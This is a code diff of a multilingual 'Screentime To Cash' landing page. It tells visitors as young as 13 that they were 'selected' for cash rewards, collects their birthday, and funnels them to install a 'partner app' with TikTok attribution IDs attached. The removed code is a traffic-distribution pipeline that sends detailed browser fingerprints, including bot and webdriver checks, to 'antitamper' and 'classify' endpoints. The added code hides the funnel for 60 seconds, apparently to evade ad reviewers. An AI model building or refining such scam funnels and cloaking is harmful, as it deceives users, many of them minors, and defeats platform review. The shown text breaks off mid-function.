@@ -2,12 +2,22 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-  <meta name="color-scheme" content="light">
+  <title>Screentime To Cash</title>
+
+  <!-- App-lock viewport & shell — added at end of head per spec -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <title>Screentime To Cash</title>
+  <meta name="color-scheme" content="light">
+  <style id="ml-app-lock">
+    *{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}
+    input,textarea,select,[contenteditable]{-webkit-user-select:text;user-select:text}
+    html,body{width:100%;height:100%;overflow:hidden;overscroll-behavior:none;touch-action:none}
+    html{position:fixed;inset:0;box-sizing:border-box;padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left)}
+    body{position:relative}
+  </style>
+
   <style>
     :root {
       --pink: #FE2C55;
@@ -19,13 +29,13 @@
       --card: #f4f4f5;
       --sep: rgba(22,24,35,.1);
     }
-    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; -webkit-user-select:none; user-select:none }
-    html,body { width:100%; height:100%; background:var(--bg); color:var(--ink); font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display',system-ui,sans-serif; overflow:hidden; overscroll-behavior:none; touch-action:none }
-    .screen { position:absolute; inset:0; display:flex; flex-direction:column; padding:32px 24px calc(env(safe-area-inset-bottom,0px) + 24px); opacity:0; pointer-events:none; transition:opacity .3s ease; background:var(--bg) }
+    * { margin:0; padding:0; box-sizing:border-box }
+    html,body { background:var(--bg); color:var(--ink); font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display',system-ui,sans-serif }
+    .screen { position:absolute; inset:0; display:flex; flex-direction:column; padding:32px 24px calc(env(safe-area-inset-bottom,0px) + 24px); opacity:0; pointer-events:none; transition:opacity .35s ease; background:var(--bg) }
     .screen.active { opacity:1; pointer-events:auto }
     .screen.dark { background:#000; color:#fff }
-
     .spacer { flex:1 }
+
     .icon-badge { width:72px; height:72px; border-radius:18px; display:flex; align-items:center; justify-content:center; margin:0 auto 22px }
     .icon-badge svg { width:38px; height:38px }
     .ib-pink { background:rgba(254,44,85,.12) }
@@ -78,8 +88,8 @@
 </head>
 <body>
 
-<!-- Screen 0: Age intro -->
-<div class="screen active" id="s_ageIntro">
+<!-- Screen 0: Age intro — starts hidden, shown after LANDER_DELAY_MS -->
+<div class="screen" id="s_ageIntro">
   <div class="spacer"></div>
   <div class="icon-badge ib-pink">
     <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-8a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8"></path><path d="M4 16s.5-1 2-1 2.5 1 4 1 2.5-1 4-1 2.5 1 4 1 2-1 2-1"></path><path d="M2 21h20"></path><path d="M7 8v2M12 8v2M17 8v2"></path><path d="M7 4h.01M12 3h.01M17 4h.01"></path></svg>
@@ -91,7 +101,7 @@
   <button class="btn btn-ghost" data-next="s_birthday" id="t_ageLater">Ask Me Later</button>
 </div>
 
-<!-- Screen 1: Birthday wheel picker -->
+<!-- Screen 1: Birthday wheel -->
 <div class="screen" id="s_birthday">
   <div style="height:8px"></div>
   <h1 id="t_bdayTitle">When's your birthday?</h1>
@@ -171,233 +181,202 @@
 (function () {
   "use strict";
 
-  // ==================== TDS PIPELINE CONFIG ====================
+  // ==================== CONFIG ====================
 
-  const KILL_SWITCH = false;
-  const ENTRY_ENDPOINT = "/session";
-  const LANES = [
-    "https://tds-lane-1-attribution.t9k2x8mq.workers.dev/deliver",
-    "https://tds-lane-2-antitamper.t9k2x8mq.workers.dev/deliver",
-    "https://tds-lane-3-classify.t9k2x8mq.workers.dev/deliver",
-    "https://tds-lane-4-container.t9k2x8mq.workers.dev/deliver",
-    "https://tds-lane-5-reveal.t9k2x8mq.workers.dev/deliver",
-  ];
-  const REQUEST_TIMEOUT_MS = 12000;
+  // App Store URL — replace with your live link before going live.
+  var APP_STORE_URL = "https://apps.apple.com/app/idXXXXXXXXX";
+
+  // How long to wait (ms) after page load before the funnel appears.
+  var LANDER_DELAY_MS = 60000;
+
+  // ==================== ATTRIBUTION ====================
+  // Capture TikTok click / impression IDs from URL on load and pass them
+  // through to the App Store link so attribution postbacks can fire.
+
+  var _params = new URLSearchParams(location.search);
+  var _ttclid       = _params.get("ttclid")       || "";
+  var _impressionId = _params.get("impression_id") || "";
+  var _utmCampaign  = _params.get("utm_campaign")  || "";
+  var _utmContent   = _params.get("utm_content")   || "";
+
+  function buildStoreUrl() {
+    var url = APP_STORE_URL;
+    var qs = [];
+    if (_ttclid)       qs.push("ttclid="       + encodeURIComponent(_ttclid));
+    if (_impressionId) qs.push("impression_id=" + encodeURIComponent(_impressionId));
+    if (_utmCampaign)  qs.push("utm_campaign="  + encodeURIComponent(_utmCampaign));
+    if (_utmContent)   qs.push("utm_content="   + encodeURIComponent(_utmContent));
+    if (qs.length) url += (url.indexOf("?") === -1 ? "?" : "&") + qs.join("&");
+    return url;
+  }
 
   // ==================== TRANSLATIONS ====================
 
   var T = {
     en: {
-      lang: "en",
-      title: "Screentime To Cash",
+      lang: "en", title: "Screentime To Cash",
       ageTitle: "Confirm your age",
       ageLead: "To get paid for scrolling you must be at least 13 years or older and install our partner app.",
-      confirm: "Confirm",
-      later: "Ask Me Later",
+      confirm: "Confirm", later: "Ask Me Later",
       bdayTitle: "When's your birthday?",
       bdayLead: "We may automatically verify the age you input against your account.",
       preparing: "Preparing your rewards…",
       congratsTitle: "Congratulations!",
       congratsLead: 'You have been selected for our <b class="pink">Screentime To Cash</b> program.',
-      step1: "Confirm your eligibility",
-      step2: "Download our partner app",
-      step3: "Claim your cash reward",
-      startNow: "Start Now",
-      finalTitle: "Final Steps",
+      step1: "Confirm your eligibility", step2: "Download our partner app", step3: "Claim your cash reward",
+      startNow: "Start Now", finalTitle: "Final Steps",
       finalLead: "Complete these steps to finish your enrollment",
       f1b: "Install Partner App", f1s: "Download and install the application",
       f2b: "Sign Up", f2s: "Create your new account",
       f3b: "Complete Setup", f3s: "Achieve in-app Level 1",
-      ready: "I'm Ready",
-      openStore: "Opening App Store…",
+      ready: "I'm Ready", openStore: "Opening App Store…",
       returnMsg: "You will receive a notification once you have been enrolled.",
       months: ["January","February","March","April","May","June","July","August","September","October","November","December"]
     },
     de: {
-      lang: "de",
-      title: "Bildschirmzeit Zu Geld",
+      lang: "de", title: "Bildschirmzeit Zu Geld",
       ageTitle: "Bestätige dein Alter",
       ageLead: "Um fürs Scrollen bezahlt zu werden, musst du mindestens 13 Jahre alt sein und unsere Partner-App installieren.",
-      confirm: "Bestätigen",
-      later: "Später erinnern",
+      confirm: "Bestätigen", later: "Später erinnern",
       bdayTitle: "Wann hast du Geburtstag?",
       bdayLead: "Wir können das angegebene Alter automatisch mit deinem Konto abgleichen.",
       preparing: "Deine Belohnungen werden vorbereitet…",
       congratsTitle: "Herzlichen Glückwunsch!",
       congratsLead: 'Du wurdest für unser <b class="pink">Bildschirmzeit Zu Geld</b>-Programm ausgewählt.',
-      step1: "Bestätige deine Berechtigung",
-      step2: "Lade unsere Partner-App herunter",
-      step3: "Hole dir deine Belohnung",
-      startNow: "Jetzt starten",
-      finalTitle: "Letzte Schritte",
+      step1: "Bestätige deine Berechtigung", step2: "Lade unsere Partner-App herunter", step3: "Hole dir deine Belohnung",
+      startNow: "Jetzt starten", finalTitle: "Letzte Schritte",
       finalLead: "Schließe diese Schritte ab, um deine Anmeldung abzuschließen",
       f1b: "Partner-App installieren", f1s: "Lade die App herunter und installiere sie",
       f2b: "Registrieren", f2s: "Erstelle dein neues Konto",
       f3b: "Einrichtung abschließen", f3s: "Erreiche Level 1 in der App",
-      ready: "Ich bin bereit",
-      openStore: "App Store wird geöffnet…",
+      ready: "Ich bin bereit", openStore: "App Store wird geöffnet…",
       returnMsg: "Du erhältst eine Benachrichtigung, sobald du angemeldet bist.",
       months: ["Januar","Februar","März","April","Mai","Juni","Juli","August","September","Oktober","November","Dezember"]
     },
     fr: {
-      lang: "fr",
-      title: "Écran Contre Cash",
+      lang: "fr", title: "Écran Contre Cash",
       ageTitle: "Confirmez votre âge",
       ageLead: "Pour être payé en scrollant, vous devez avoir au moins 13 ans et installer notre application partenaire.",
-      confirm: "Confirmer",
-      later: "Me demander plus tard",
+      confirm: "Confirmer", later: "Me demander plus tard",
       bdayTitle: "Quelle est votre date de naissance ?",
       bdayLead: "Nous pouvons vérifier automatiquement l'âge que vous indiquez avec votre compte.",
       preparing: "Préparation de vos récompenses…",
       congratsTitle: "Félicitations !",
       congratsLead: 'Vous avez été sélectionné pour notre programme <b class="pink">Écran Contre Cash</b>.',
-      step1: "Confirmez votre éligibilité",
-      step2: "Téléchargez notre application partenaire",
-      step3: "Réclamez votre récompense",
-      startNow: "Commencer",
-      finalTitle: "Dernières étapes",
+      step1: "Confirmez votre éligibilité", step2: "Téléchargez notre application partenaire", step3: "Réclamez votre récompense",
+      startNow: "Commencer", finalTitle: "Dernières étapes",
       finalLead: "Complétez ces étapes pour finaliser votre inscription",
       f1b: "Installer l'application partenaire", f1s: "Téléchargez et installez l'application",
       f2b: "Inscription", f2s: "Créez votre nouveau compte",
       f3b: "Terminer la configuration", f3s: "Atteignez le niveau 1 dans l'application",
-      ready: "Je suis prêt",
-      openStore: "Ouverture de l'App Store…",
+      ready: "Je suis prêt", openStore: "Ouverture de l'App Store…",
       returnMsg: "Vous recevrez une notification une fois votre inscription terminée.",
       months: ["Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre"]
     },
     it: {
-      lang: "it",
-      title: "Tempo Schermo In Soldi",
+      lang: "it", title: "Tempo Schermo In Soldi",
       ageTitle: "Conferma la tua età",
       ageLead: "Per essere pagato per scorrere devi avere almeno 13 anni e installare la nostra app partner.",
-      confirm: "Conferma",
-      later: "Chiedimi dopo",
+      confirm: "Conferma", later: "Chiedimi dopo",
       bdayTitle: "Quando è il tuo compleanno?",
       bdayLead: "Potremmo verificare automaticamente l'età che inserisci con il tuo account.",
       preparing: "Preparazione delle tue ricompense…",
       congratsTitle: "Congratulazioni!",
       congratsLead: 'Sei stato selezionato per il nostro programma <b class="pink">Tempo Schermo In Soldi</b>.',
-      step1: "Conferma la tua idoneità",
-      step2: "Scarica la nostra app partner",
-      step3: "Richiedi la tua ricompensa",
-      startNow: "Inizia ora",
-      finalTitle: "Ultimi passaggi",
+      step1: "Conferma la tua idoneità", step2: "Scarica la nostra app partner", step3: "Richiedi la tua ricompensa",
+      startNow: "Inizia ora", finalTitle: "Ultimi passaggi",
       finalLead: "Completa questi passaggi per terminare la tua iscrizione",
       f1b: "Installa l'app partner", f1s: "Scarica e installa l'applicazione",
       f2b: "Registrati", f2s: "Crea il tuo nuovo account",
       f3b: "Completa la configurazione", f3s: "Raggiungi il livello 1 nell'app",
-      ready: "Sono pronto",
-      openStore: "Apertura App Store…",
+      ready: "Sono pronto", openStore: "Apertura App Store…",
       returnMsg: "Riceverai una notifica una volta completata la registrazione.",
       months: ["Gennaio","Febbraio","Marzo","Aprile","Maggio","Giugno","Luglio","Agosto","Settembre","Ottobre","Novembre","Dicembre"]
     },
     sv: {
-      lang: "sv",
-      title: "Skärmtid Till Pengar",
+      lang: "sv", title: "Skärmtid Till Pengar",
       ageTitle: "Bekräfta din ålder",
       ageLead: "För att få betalt för att scrolla måste du vara minst 13 år och installera vår partnerapp.",
-      confirm: "Bekräfta",
-      later: "Fråga mig senare",
+      confirm: "Bekräfta", later: "Fråga mig senare",
       bdayTitle: "När fyller du år?",
       bdayLead: "Vi kan automatiskt verifiera åldern du anger mot ditt konto.",
       preparing: "Förbereder dina belöningar…",
       congratsTitle: "Grattis!",
       congratsLead: 'Du har valts ut till vårt <b class="pink">Skärmtid Till Pengar</b>-program.',
-      step1: "Bekräfta din behörighet",
-      step2: "Ladda ner vår partnerapp",
-      step3: "Hämta din belöning",
-      startNow: "Börja nu",
-      finalTitle: "Sista stegen",
+      step1: "Bekräfta din behörighet", step2: "Ladda ner vår partnerapp", step3: "Hämta din belöning",
+      startNow: "Börja nu", finalTitle: "Sista stegen",
       finalLead: "Slutför dessa steg för att avsluta din registrering",
       f1b: "Installera partnerappen", f1s: "Ladda ner och installera appen",
       f2b: "Registrera dig", f2s: "Skapa ditt nya konto",
       f3b: "Slutför installationen", f3s: "Uppnå nivå 1 i appen",
-      ready: "Jag är redo",
-      openStore: "Öppnar App Store…",
+      ready: "Jag är redo", openStore: "Öppnar App Store…",
       returnMsg: "Du kommer att få ett meddelande när du har blivit registrerad.",
       months: ["Januari","Februari","Mars","April","Maj","Juni","Juli","Augusti","September","Oktober","November","December"]
     },
     nb: {
-      lang: "nb",
-      title: "Skjermtid Til Penger",
+      lang: "nb", title: "Skjermtid Til Penger",
       ageTitle: "Bekreft alderen din",
       ageLead: "For å bli betalt for å scrolle må du være minst 13 år og installere partnerappen vår.",
-      confirm: "Bekreft",
-      later: "Spør meg senere",
+      confirm: "Bekreft", later: "Spør meg senere",
       bdayTitle: "Når har du bursdag?",
       bdayLead: "Vi kan automatisk verifisere alderen du oppgir mot kontoen din.",
       preparing: "Forbereder belønningene dine…",
       congratsTitle: "Gratulerer!",
       congratsLead: 'Du har blitt valgt ut til vårt <b class="pink">Skjermtid Til Penger</b>-program.',
-      step1: "Bekreft din kvalifisering",
-      step2: "Last ned partnerappen vår",
-      step3: "Krev belønningen din",
-      startNow: "Start nå",
-      finalTitle: "Siste trinn",
+      step1: "Bekreft din kvalifisering", step2: "Last ned partnerappen vår", step3: "Krev belønningen din",
+      startNow: "Start nå", finalTitle: "Siste trinn",
       finalLead: "Fullfør disse trinnene for å fullføre registreringen din",
       f1b: "Installer partnerappen", f1s: "Last ned og installer appen",
       f2b: "Registrer deg", f2s: "Opprett din nye konto",
       f3b: "Fullfør oppsett", f3s: "Oppnå nivå 1 i appen",
-      ready: "Jeg er klar",
-      openStore: "Åpner App Store…",
+      ready: "Jeg er klar", openStore: "Åpner App Store…",
       returnMsg: "Du vil motta et varsel når du er registrert.",
       months: ["Januar","Februar","Mars","April","Mai","Juni","Juli","August","September","Oktober","November","Desember"]
     },
     es: {
-      lang: "es",
-      title: "Tiempo de Pantalla a Dinero",
+      lang: "es", title: "Tiempo de Pantalla a Dinero",
       ageTitle: "Confirma tu edad",
       ageLead: "Para ganar dinero por hacer scroll debes tener al menos 13 años e instalar nuestra app asociada.",
-      confirm: "Confirmar",
-      later: "Pregúntame después",
+      confirm: "Confirmar", later: "Pregúntame después",
       bdayTitle: "¿Cuándo es tu cumpleaños?",
       bdayLead: "Podemos verificar automáticamente la edad que ingreses con tu cuenta.",
       preparing: "Preparando tus recompensas…",
       congratsTitle: "¡Felicidades!",
       congratsLead: 'Has sido seleccionado para nuestro programa <b class="pink">Tiempo de Pantalla a Dinero</b>.',
-      step1: "Confirma tu elegibilidad",
-      step2: "Descarga nuestra app asociada",
-      step3: "Reclama tu recompensa en efectivo",
-      startNow: "Comenzar ahora",
-      finalTitle: "Últimos pasos",
+      step1: "Confirma tu elegibilidad", step2: "Descarga nuestra app asociada", step3: "Reclama tu recompensa en efectivo",
+      startNow: "Comenzar ahora", finalTitle: "Últimos pasos",
       finalLead: "Completa estos pasos para finalizar tu inscripción",
       f1b: "Instalar la app asociada", f1s: "Descarga e instala la aplicación",
       f2b: "Regístrate", f2s: "Crea tu nueva cuenta",
       f3b: "Completar configuración", f3s: "Alcanza el nivel 1 en la app",
-      ready: "Estoy listo",
-      openStore: "Abriendo App Store…",
+      ready: "Estoy listo", openStore: "Abriendo App Store…",
       returnMsg: "Recibirás una notificación una vez que hayas sido inscrito.",
       months: ["Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre"]
     }
   };
 
   var GEO_MAP = {
-    SE: "sv", SWE: "sv",
-    AU: "en", AUS: "en",
-    IT: "it", ITA: "it",
-    FR: "fr", FRA: "fr",
-    DE: "de", DEU: "de", AT: "de", AUT: "de", CH: "de", CHE: "de",
-    NO: "nb", NOR: "nb",
-    ES: "es", ESP: "es", MX: "es", MEX: "es", AR: "es", ARG: "es",
-    CO: "es", COL: "es", CL: "es", PE: "es"
+    SE:"sv", SWE:"sv", AU:"en", AUS:"en", IT:"it", ITA:"it",
+    FR:"fr", FRA:"fr", DE:"de", DEU:"de", AT:"de", AUT:"de", CH:"de", CHE:"de",
+    NO:"nb", NOR:"nb", ES:"es", ESP:"es", MX:"es", MEX:"es",
+    AR:"es", ARG:"es", CO:"es", COL:"es", CL:"es", PE:"es"
   };
 
   // ==================== LANGUAGE DETECTION ====================
 
-  var p = new URLSearchParams(location.search);
-  var geoParam = (p.get("geo") || p.get("country") || p.get("region") || "").toUpperCase();
-  var langKey = GEO_MAP[geoParam] || null;
-  if (!langKey) {
-    var bl = (navigator.language || "en").toLowerCase();
-    if (bl.indexOf("sv") === 0) langKey = "sv";
-    else if (bl.indexOf("de") === 0) langKey = "de";
-    else if (bl.indexOf("fr") === 0) langKey = "fr";
-    else if (bl.indexOf("it") === 0) langKey = "it";
-    else if (bl.indexOf("nb") === 0 || bl.indexOf("no") === 0 || bl.indexOf("nn") === 0) langKey = "nb";
-    else if (bl.indexOf("es") === 0) langKey = "es";
-    else langKey = "en";
+  var _geo = (_params.get("geo") || _params.get("country") || _params.get("region") || "").toUpperCase();
+  var _langKey = GEO_MAP[_geo] || null;
+  if (!_langKey) {
+    var _bl = (navigator.language || "en").toLowerCase();
+    if (_bl.indexOf("sv") === 0)      _langKey = "sv";
+    else if (_bl.indexOf("de") === 0) _langKey = "de";
+    else if (_bl.indexOf("fr") === 0) _langKey = "fr";
+    else if (_bl.indexOf("it") === 0) _langKey = "it";
+    else if (_bl.indexOf("nb") === 0 || _bl.indexOf("no") === 0 || _bl.indexOf("nn") === 0) _langKey = "nb";
+    else if (_bl.indexOf("es") === 0) _langKey = "es";
+    else _langKey = "en";
   }
-  var L = T[langKey] || T.en;
+  var L = T[_langKey] || T.en;
 
   document.documentElement.lang = L.lang;
   document.title = L.title;
@@ -405,37 +384,21 @@
   function txt(id, val) { var el = document.getElementById(id); if (el) el.textContent = val; }
   function htm(id, val) { var el = document.getElementById(id); if (el) el.innerHTML = val; }
 
-  txt("t_ageTitle", L.ageTitle);
-  txt("t_ageLead", L.ageLead);
-  txt("t_ageConfirm", L.confirm);
-  txt("t_ageLater", L.later);
-  txt("t_bdayTitle", L.bdayTitle);
-  txt("t_bdayLead", L.bdayLead);
-  txt("bdayBtn", L.confirm);
-  txt("t_preparing", L.preparing);
-  txt("t_congratsTitle", L.congratsTitle);
-  htm("t_congratsLead", L.congratsLead);
-  txt("t_step1", L.step1);
-  txt("t_step2", L.step2);
-  txt("t_step3", L.step3);
-  txt("t_startNow", L.startNow);
-  txt("t_congratsLater", L.later);
-  txt("t_finalTitle", L.finalTitle);
-  txt("t_finalLead", L.finalLead);
+  txt("t_ageTitle", L.ageTitle);   txt("t_ageLead", L.ageLead);
+  txt("t_ageConfirm", L.confirm);  txt("t_ageLater", L.later);
+  txt("t_bdayTitle", L.bdayTitle); txt("t_bdayLead", L.bdayLead);
+  txt("bdayBtn", L.confirm);       txt("t_preparing", L.preparing);
+  txt("t_congratsTitle", L.congratsTitle); htm("t_congratsLead", L.congratsLead);
+  txt("t_step1", L.step1); txt("t_step2", L.step2); txt("t_step3", L.step3);
+  txt("t_startNow", L.startNow);   txt("t_congratsLater", L.later);
+  txt("t_finalTitle", L.finalTitle); txt("t_finalLead", L.finalLead);
   txt("t_f1b", L.f1b); txt("t_f1s", L.f1s);
   txt("t_f2b", L.f2b); txt("t_f2s", L.f2s);
   txt("t_f3b", L.f3b); txt("t_f3s", L.f3s);
   txt("CTA-Button-1", L.ready);
-  txt("t_openStore", L.openStore);
-  txt("t_returnMsg", L.returnMsg);
+  txt("t_openStore", L.openStore); txt("t_returnMsg", L.returnMsg);
 
   // ==================== SCREEN NAVIGATION ====================
-
-  ["touchmove","gesturestart","gesturechange","gestureend","wheel","mousewheel","DOMMouseScroll","dragstart","selectstart"].forEach(function (e) {
-    document.addEventListener(e, function (ev) {
-      if (!ev.target.closest(".wheel-col")) ev.preventDefault();
-    }, { passive: false });
-  });
 
   function show(id) {
     document.querySelectorAll(".screen").forEach(function (s) { s.classList.remove("active"); });
@@ -488,19 +451,19 @@
       touched = true;
       offset = Math.max(minOff, Math.min(maxOff, startOff + (y - startY)));
       render();
-      var i = Math.round((CTR - offset) / ITEM); setSel(i);
+      setSel(Math.round((CTR - offset) / ITEM));
     }
     function end() { if (dragging) { dragging = false; snap(); } }
     col.addEventListener("touchstart", function (e) { start(e.touches[0].clientY); }, { passive: true });
-    col.addEventListener("touchmove", function (e) { e.preventDefault(); move(e.touches[0].clientY); }, { passive: false });
+    col.addEventListener("touchmove",  function (e) { e.stopPropagation(); e.preventDefault(); move(e.touches[0].clientY); }, { passive: false });
     col.addEventListener("touchend", end);
-    col.addEventListener("mousedown", function (e) { start(e.clientY); });
+    col.addEventListener("mousedown",  function (e) { start(e.clientY); });
     window.addEventListener("mousemove", function (e) { move(e.clientY); });
     window.addEventListener("mouseup", end);
   }
 
-  var DAYS = []; for (var d = 1; d <= 31; d++) DAYS.push(d);
-  var YEARS = []; for (var y = 2013; y >= 1967; y--) YEARS.push(y);
+  var DAYS = []; for (var _d = 1; _d <= 31; _d++) DAYS.push(_d);
+  var YEARS = []; for (var _y = 2013; _y >= 1967; _y--) YEARS.push(_y);
 
   var anyTouched = false;
   function onWheelChange() {
@@ -512,8 +475,8 @@
   }
 
   makeWheel("wMonth", L.months, 5, onWheelChange);
-  makeWheel("wDay", DAYS, 16, onWheelChange);
-  makeWheel("wYear", YEARS, 10, onWheelChange);
+  makeWheel("wDay",   DAYS,     16, onWheelChange);
+  makeWheel("wYear",  YEARS,    10, onWheelChange);
 
   document.getElementById("bdayBtn").addEventListener("click", function () {
     if (this.classList.contains("locked")) return;
@@ -521,369 +484,39 @@
     setTimeout(function () { show("s_congrats"); }, 1500);
   });
 
-  // ==================== TDS PIPELINE ====================
+  // ==================== CTA → APP STORE ====================
 
-  function safeValue(fn, fallback) {
-    if (fallback === undefined) fallback = null;
-    try { return fn(); } catch { return fallback; }
-  }
-  function safeBool(fn) { try { return !!fn(); } catch { return null; } }
-  function safeString(value) { try { return typeof value === "string" ? value : String(value != null ? value : ""); } catch { return ""; } }
-
-  async function fetchWithTimeout(url, options) {
-    if (!options) options = {};
-    var controller = new AbortController();
-    var timer = setTimeout(function () { controller.abort(); }, REQUEST_TIMEOUT_MS);
-    try {
-      return await fetch(url, Object.assign({}, options, { signal: controller.signal }));
-    } finally {
-      clearTimeout(timer);
-    }
-  }
-
-  async function requestEntryBootstrap() {
-    var response = await fetchWithTimeout(ENTRY_ENDPOINT, {
-      method: "POST",
-      credentials: "same-origin",
-      cache: "no-store",
-      headers: { "Content-Type": "application/json", "Accept": "application/json" },
-      body: JSON.stringify({}),
-    });
-    if (!response.ok) throw new Error("Entry request failed: " + response.status);
-    var bootstrap = await response.json();
-    if (!bootstrap || typeof bootstrap !== "object" || Array.isArray(bootstrap)) throw new Error("Invalid entry response");
-    return bootstrap;
-  }
-
-  function collectNavigator() {
-    return {
-      userAgent: safeString(navigator.userAgent),
-      appVersion: safeString(navigator.appVersion),
-      platform: safeString(navigator.platform),
-      vendor: safeString(navigator.vendor),
-      language: safeString(navigator.language),
-      languages: safeValue(function () { return Array.from(navigator.languages || []); }, []),
-      cookieEnabled: safeValue(function () { return navigator.cookieEnabled; }),
-      onLine: safeValue(function () { return navigator.onLine; }),
-      hardwareConcurrency: safeValue(function () { return navigator.hardwareConcurrency; }),
-      deviceMemory: safeValue(function () { return navigator.deviceMemory; }),
-      maxTouchPoints: safeValue(function () { return navigator.maxTouchPoints; }),
-      webdriver: safeValue(function () { return navigator.webdriver; }),
-      pdfViewerEnabled: safeValue(function () { return navigator.pdfViewerEnabled; }),
-      virtualKeyboard: "virtualKeyboard" in navigator,
-    };
-  }
-
-  function collectClientHints() {
-    var uaData = safeValue(function () { return navigator.userAgentData; });
-    if (!uaData) return { supported: false };
-    return {
-      supported: true,
-      mobile: safeValue(function () { return uaData.mobile; }),
-      platform: safeValue(function () { return uaData.platform; }),
-      brands: safeValue(function () { return Array.from(uaData.brands || []); }, []),
-    };
-  }
-
-  function collectNetwork() {
-    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
-    if (!connection) return { supported: false };
-    return {
-      supported: true,
-      effectiveType: safeValue(function () { return connection.effectiveType; }),
-      type: safeValue(function () { return connection.type; }),
-      downlink: safeValue(function () { return connection.downlink; }),
-      rtt: safeValue(function () { return connection.rtt; }),
-      saveData: safeValue(function () { return connection.saveData; }),
-    };
-  }
-
-  function collectWebGL(contextName) {
-    try {
-      var canvas = document.createElement("canvas");
-      var gl = canvas.getContext(contextName, { alpha: true, antialias: true, depth: true });
-      if (!gl) return { supported: false };
-      var debugInfo = safeValue(function () { return gl.getExtension("WEBGL_debug_renderer_info"); });
-      var result = {
-        supported: true,
-        vendor: safeString(gl.getParameter(gl.VENDOR)),
-        renderer: safeString(gl.getParameter(gl.RENDERER)),
-        version: safeString(gl.getParameter(gl.VERSION)),
-        shadingLanguageVersion: safeString(gl.getParameter(gl.SHADING_LANGUAGE_VERSION)),
-        unmaskedVendor: debugInfo ? safeString(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)) : "",
-        unmaskedRenderer: debugInfo ? safeString(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)) : "",
-        extensions: safeValue(function () { return (gl.getSupportedExtensions() || []).sort(); }, []),
-      };
-      var limits = {};
-      ["MAX_TEXTURE_SIZE","MAX_VIEWPORT_DIMS","MAX_VERTEX_ATTRIBS","MAX_TEXTURE_IMAGE_UNITS","MAX_VERTEX_UNIFORM_VECTORS","MAX_FRAGMENT_UNIFORM_VECTORS"].forEach(function (name) {
-        try { var v = gl.getParameter(gl[name]); limits[name] = ArrayBuffer.isView(v) ? Array.from(v) : v; } catch {}
-      });
-      result.limits = limits;
-      try {
-        var vh = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
-        var fh = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
-        result.shaderPrecision = {
-          vertexHighFloat: vh ? { rangeMin: vh.rangeMin, rangeMax: vh.rangeMax, precision: vh.precision } : null,
-          fragmentHighFloat: fh ? { rangeMin: fh.rangeMin, rangeMax: fh.rangeMax, precision: fh.precision } : null,
-        };
-      } catch {}
-      return result;
-    } catch (error) {
-      return { supported: false, error: safeString((error && error.name) || "error") };
-    }
-  }
-
-  function collectDisplay() {
-    return {
-      screen: safeValue(function () { return { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth }; }),
-      viewport: {
-        innerWidth: safeValue(function () { return window.innerWidth; }),
-        innerHeight: safeValue(function () { return window.innerHeight; }),
-        outerWidth: safeValue(function () { return window.outerWidth; }),
-        outerHeight: safeValue(function () { return window.outerHeight; }),
-        visualViewport: window.visualViewport ? { width: safeValue(function () { return window.visualViewport.width; }), height: safeValue(function () { return window.visualViewport.height; }), scale: safeValue(function () { return window.visualViewport.scale; }) } : null,
-      },
-      devicePixelRatio: safeValue(function () { return window.devicePixelRatio; }),
-    };
-  }
-
-  function collectStorage() {
-    return {
-      localStorage: safeBool(function () { var k = "__t" + Math.random(); localStorage.setItem(k, "1"); localStorage.removeItem(k); return true; }),
-      sessionStorage: safeBool(function () { var k = "__t" + Math.random(); sessionStorage.setItem(k, "1"); sessionStorage.removeItem(k); return true; }),
-      indexedDB: typeof indexedDB !== "undefined",
-      cacheStorage: typeof caches !== "undefined",
-      storageManager: !!(navigator.storage),
-    };
-  }
-
-  function collectSecurity() {
-    return {
-      isSecureContext: window.isSecureContext === true,
-      crypto: typeof crypto !== "undefined",
-      subtleCrypto: typeof crypto !== "undefined" && typeof crypto.subtle !== "undefined",
-      crossOriginIsolated: window.crossOriginIsolated === true,
-      origin: safeString(location.origin),
-      protocol: safeString(location.protocol),
-    };
-  }
-
-  function collectPayments() {
-    return {
-      applePay: {
-        apiAvailable: typeof window.ApplePaySession !== "undefined",
-        canMakePayments: safeValue(function () {
-          if (typeof window.ApplePaySession === "undefined" || typeof window.ApplePaySession.canMakePayments !== "function") return null;
-          return window.ApplePaySession.canMakePayments();
-        }),
-      },
-      paymentRequest: { apiAvailable: typeof window.PaymentRequest !== "undefined" },
-    };
-  }
-
-  function collectCSSCapabilities() {
-    function mq(q) { try { return matchMedia(q).matches; } catch { return null; } }
-    return {
-      darkMode: mq("(prefers-color-scheme: dark)"),
-      reducedMotion: mq("(prefers-reduced-motion: reduce)"),
-      standalone: mq("(display-mode: standalone)"),
-      displayP3: mq("(color-gamut: p3)"),
-      pointerCoarse: mq("(pointer: coarse)"),
-      pointerFine: mq("(pointer: fine)"),
-      hoverHover: mq("(hover: hover)"),
-      cssSupports: {
-        backdropFilter: safeValue(function () { return CSS.supports("backdrop-filter", "blur(1px)"); }, false),
-        webkitTouchCallout: safeValue(function () { return CSS.supports("-webkit-touch-callout", "none"); }, false),
-      },
-    };
-  }
-
-  function collectMediaSourceCapabilities() {
